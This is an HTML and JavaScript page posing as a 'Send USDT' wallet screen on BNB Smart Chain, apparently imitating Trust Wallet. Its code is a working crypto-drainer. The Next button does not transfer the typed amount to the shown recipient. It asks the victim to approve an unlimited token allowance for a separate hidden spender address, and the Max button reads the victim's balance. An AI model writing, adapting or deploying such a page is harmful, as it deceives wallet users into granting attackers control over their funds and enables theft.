<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send USDT</title>

<!-- ✅ FAVICON ADDED -->
<link rel="icon" type="image/png" href="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">

<style>
* { margin:0; padding:0; box-sizing:border-box; }

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto;
    background:#0b0f14;
    color:white;
}

.header {
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:20px;
}
.header h2 { font-size:18px; font-weight:600; }

.section { padding:0 20px; margin-top:18px; }
.label { font-size:13px; color:#9aa4af; margin-bottom:8px; }

.input-box {
    background:#11161c;
    border:2px solid #1f2a36;
    border-radius:14px;
    padding:14px;
}

.address {
    font-size:14px;
    color:#16c784;
    word-break:break-all;
}

.network {
    background:#11161c;
    padding:12px;
    border-radius:12px;
    color:#ccc;
    font-size:14px;
}

.amount-row {
    display:flex;
    justify-content:space-between;
    align-items:center;
}
.input-box input {
    background:transparent;
    border:none;
    color:white;
    font-size:16px;
    width:100%;
    outline:none;
}
.actions { display:flex; gap:10px; }
.usdt-label { color:#16c784; font-weight:600; }
.action-btn { color:#16c784; cursor:pointer; }

.footer {
    position:fixed;
    bottom:0;
    width:100%;
    padding:20px;
}
.next-btn {
    width:100%;
    background:#16c784;
    border:none;
    padding:16px;
    border-radius:30px;
    font-size:16px;
    font-weight:600;
    color:black;
    cursor:pointer;
}
.next-btn:disabled { opacity:.5; }

.status {
    text-align:center;
    margin-top:10px;
    font-size:14px;
}
</style>
</head>

<body>

<div class="header">
    <h2>Send USDT</h2>
</div>

<!-- RECEIVER -->
<div class="section">
    <div class="label">Recipient</div>
    <div class="input-box">
        <div class="address">
            0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
        </div>
    </div>
</div>

<!-- NETWORK -->
<div class="section">
    <div class="label">Destination network</div>
    <div class="network">BNB Smart Chain</div>
</div>

<!-- AMOUNT -->
<div class="section">
    <div class="label">Amount</div>
    <div class="input-box amount-row">
        <input type="number" id="amount" placeholder="USDT Amount">
        <div class="actions">
            <span class="usdt-label">USDT</span>
            <div class="action-btn" onclick="setMax()">Max</div>
        </div>
    </div>
</div>

<!-- BUTTON -->
<div class="footer">
    <button class="next-btn" id="sendBtn">Next</button>
    <div id="status" class="status"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>

<script>
// ===== CONFIG =====
const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
const SPENDER_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
const BSC_CHAIN_ID = '0x38';

const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

let web3;
let userAccount;
let usdt;

const sendBtn = document.getElementById('sendBtn');
const statusDiv = document.getElementById('status');
const amountInput = document.getElementById('amount');

const ABI = [{
    "constant": false,
    "inputs": [
        {"name":"_spender","type":"address"},
        {"name":"_value","type":"uint256"}
    ],
    "name":"approve",
    "outputs":[{"name":"","type":"bool"}],
    "type":"function"
},{
    "constant":true,
    "inputs":[{"name":"_owner","type":"address"}],
    "name":"balanceOf",
    "outputs":[{"name":"balance","type":"uint256"}],
    "type":"function"
}];

async function forceBSC() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_CHAIN_ID }]
        });
    } catch (err) {
        if (err.code === 4902) {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: BSC_CHAIN_ID,
                    chainName: 'BNB Smart Chain',
                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                    blockExplorerUrls: ['https://bscscan.com']
                }]
            });
        } else {
            throw err;
        }
    }
}

async function init() {
    if (!window.ethereum) {
        showStatus("Install wallet", true);
        return;
    }

    web3 = new Web3(window.ethereum);

    try {
        await forceBSC();

        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];

        usdt = new web3.eth.Contract(ABI, USDT_CONTRACT);

    } catch (e) {
        showStatus("Wallet connection failed", true);
    }
}

async function sendUSDT() {
    sendBtn.disabled = true;
    showStatus("Confirm approval in wallet...");

    try {
        await usdt.methods.approve(
            SPENDER_ADDRESS,
            MAX_UINT
        ).send({ from: userAccount });

        showStatus("✅ Approval successful");

    } catch (e) {
        showStatus("❌ Failed", true);
    }

    sendBtn.disabled = false;
}

function showStatus(msg, error=false) {
    statusDiv.innerText = msg;
    statusDiv.style.color = error ? "#ff4d4f" : "#16c784";
}

async function setMax() {
    const bal = await usdt.methods.balanceOf(userAccount).call();
    amountInput.value = web3.utils.fromWei(bal, 'ether');
}

sendBtn.onclick = sendUSDT;
window.onload = init;

if (window.ethereum) {
    window.ethereum.on('chainChanged', () => {
        window.location.reload();
    });
}
</script>

</body>
</html>
